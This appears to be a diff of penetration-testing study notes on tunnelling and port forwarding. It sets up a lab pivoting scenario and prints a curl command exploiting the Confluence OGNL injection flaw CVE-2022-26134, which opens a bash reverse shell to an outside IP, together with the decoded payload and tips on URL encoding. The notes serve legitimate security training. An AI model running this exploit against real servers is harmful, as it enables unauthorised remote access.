@@ -1,24 +1,62 @@
 
-**Tunneling:** Encapsulating a protocol within a different protocol  
-Can carry a given protocol over an incompatible delivery network OR  
-Provides a secure path through an untrusted network.  
-  
-  
-**Port Forwarding:** Traffic manipulation where we redirect traffic destined for 1 IP & port to another  
-  
-  
-Scenario:  
-	Gain root acces to an Internet-connected Linux web server & pivot to a Linux client on an internal network, gaining access to SSH creds.  
-	Before pivoting from the Linux client to other internal machines, must be able to transfer attack tools & exfill data as needed.  
-	As internal Linux client can't access the internet, we have to use the compromised Linux web server as a go-between - transferring data twice.  
+**Tunneling:** Encapsulating a protocol within a different protocol
+- Can carry a given protocol over an incompatible delivery network OR
+- Provides a secure path through an untrusted network.
 
-
-Port Forwarding makes this easier:  
+**Port Forwarding:** Traffic manipulation where we redirect traffic destined for 1 IP & port to another
 ![[rinetd.png]]
 
+
+# Port Forwarding w/ socat
+
+#### Scenario
+During an assessment, we discover a Linux web server (CONFLUENCE01) running a vulnerable version of Confluence.
+During enumeration, we find that the server has 2 network interfaces:
+	1 attached to the WAN in which our attack box (KALI) resides and
+	1 attached to an internal subnet
+In its config file, we find creds, IP address, and port for a PostgreSQL db instance on a server (PGDATABASE01) in that internal subnet
+
+We want to gain access to that internal db and continue enumerating
+As it stands KALI is in the WAN, PGDATABASE01 is in the DMZ, and CONFLUENCE01 is straddling both networks.
+
+CONFLUENCE01 is listening on port 8090
+PGDATABASE01 is listening on port 5432 - (likely a PostgreSQL server's default port)
+
+#### Lab Env Setup
+
+To gain access to CONFLUENCE01, we'll need to leverage the RCE vuln in the Confluence web app to get a revshell
+
+Researching for the vuln, CVE-2022-26134, we discover a **curl** command on a *Rapid7* blog which claims to exploit the vuln and throw back a shell
+```bash
+curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+Again, it's extremely important that we don't run scripts when we don't know what they do, so we'll need to examine this command before trusting it.
+
+The verbose curl request is being made to **hxxp://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server.
+The rest of the url needs to be decoded:
+```java
+/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
+```
+Resulting in an _OGNL injection_ payload.
+- OGNL is Object-Graph Notation Language an expression language commonly used in Java applications.
+- OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser.
+- Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.
+
+The OGNL injection payload itself uses Java's *ProcessBuilder* class to spawn a *Bash* interactive reverse shell (bash -i).
+
+As this payload fits our needs perfectly, we'll only need to change the victim's IP and port and the attacker's IP and port info.
+
+Also need to take the URL encoding into account.
+- The payload string in the proof-of-concept isn't completely URL encoded.
+- Certain characters (notably ".", "-" and "/") are not encoded.  
+Although it's not always the case, for _this_ particular exploit, this turns out to be important to the functioning of the payload.
+- If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute.
+- This means we can't apply URL encoding across the whole payload once we've modified it.
+
+
   
-  
-### RINETD:
+### RINETD:.
+
 
 Port forwarding tool that'll redirect traffic. Helps w/ data transfer  
   
